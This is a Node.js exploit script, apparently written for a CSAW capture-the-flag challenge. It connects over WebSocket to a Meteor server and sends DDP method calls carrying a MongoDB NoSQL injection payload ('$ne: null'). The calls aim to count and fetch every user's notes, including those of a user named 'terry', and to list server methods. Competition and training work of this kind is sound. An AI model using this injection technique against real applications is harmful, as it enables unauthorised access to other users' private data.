const WebSocket = require('ws');
const crypto = require('crypto');

// Create a random client ID
const clientId = crypto.randomBytes(8).toString('hex');

// Connect to the Meteor server via WebSocket
const ws = new WebSocket(`ws://web.chal.csaw.io:5000/sockjs/${Math.random().toString(36).substring(2, 15)}/${clientId}/websocket`);

// Connection established
ws.on('open', function open() {
  console.log('Connected to WebSocket server');

  // Send the connection message
  ws.send(JSON.stringify({
    msg: 'connect',
    version: '1',
    support: ['1', 'pre2', 'pre1']
  }));

  // After connecting, let's call the notes.count method with NoSQL injection
  setTimeout(() => {
    const nosqlPayload = { owner: { $ne: null } };
    console.log('Sending notes.count method call with NoSQL injection:', nosqlPayload);

    ws.send(JSON.stringify({
      msg: 'method',
      method: 'notes.count',
      params: [nosqlPayload],
      id: '1'
    }));

    // Let's also try to find notes specifically from Terry
    setTimeout(() => {
      const terryPayload = { owner: 'terry' };
      console.log('Sending notes.find method call for Terry\'s notes:', terryPayload);

      ws.send(JSON.stringify({
        msg: 'method',
        method: 'notes.find',
        params: [terryPayload],
        id: '2'
      }));

      // Also try a notes.get method if it exists
      setTimeout(() => {
        console.log('Trying notes.get method for all notes...');

        ws.send(JSON.stringify({
          msg: 'method',
          method: 'notes.get',
          params: [{ owner: { $ne: null } }],
          id: '3'
        }));

        // Let's try a generic method to list available methods
        setTimeout(() => {
          console.log('Trying to list available methods...');

          ws.send(JSON.stringify({
            msg: 'method',
            method: 'listMethods',
            params: [],
            id: '4'
          }));
        }, 500);
      }, 500);
    }, 500);
  }, 1000);
});

// Message received
ws.on('message', function incoming(data) {
  console.log('Received:', data.toString());
  try {
    const parsed = JSON.parse(data.toString().substring(1)); // Remove the 'a' prefix
    console.log('Parsed response:', JSON.stringify(parsed, null, 2));
  } catch (e) {
    console.log('Could not parse response (probably a handshake message)');
  }
});

// Connection error
ws.on('error', function error(err) {
  console.error('WebSocket error:', err);
});

// Connection closed
ws.on('close', function close() {
  console.log('Disconnected from WebSocket server');
});

